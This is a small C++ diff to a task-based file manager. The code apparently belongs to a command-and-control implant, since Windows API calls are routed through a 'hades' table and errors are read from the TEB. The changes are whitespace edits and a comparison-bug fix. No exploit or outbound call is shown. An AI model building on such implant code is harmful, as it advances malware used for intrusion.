@@ -1,4 +1,6 @@
 #include "files.hpp"
+#include "../hades/hades.h"
+#include "../utils/bytes.hpp"
 #include <stdio.h>
 
 BOOL FileMgr::InsertTask(UINT32 TaskID, HANDLE handle, TaskType type) {
@@ -30,7 +32,7 @@ BOOL FileMgr::ProcessEntry(FileTasks* task) {
     if (!task) {
         return TRUE;
     }
-    
+
 
     if (task->Status == FileDone || task->Status == FileFail ||
         !task->hProc || task->hProc == INVALID_HANDLE_VALUE) {
@@ -39,7 +41,7 @@ BOOL FileMgr::ProcessEntry(FileTasks* task) {
 
     DWORD BytesRead = 0;
     PBYTE buf = AllocMemory<BYTE>(FILE_CHUNK_SIZE);
-   
+
     if (!hades->WinApis.ReadFile(task->hProc, buf, FILE_CHUNK_SIZE, &BytesRead, NULL)) {
         DWORD err = GetTeb()->LastErrorValue;
         task->Status = FileFail;
@@ -81,7 +83,7 @@ BOOL FileMgr::ProcessEntry(FileTasks* task) {
 
 HANDLE FileMgr::GetHandle(UINT32 TaskID) {
     for (FileTasks* cur = this->head; cur != NULL; cur = cur->next) {
-        if (cur->TaskID = TaskID) {
+        if (cur->TaskID == TaskID) {
             return cur->hProc;
         }
     }
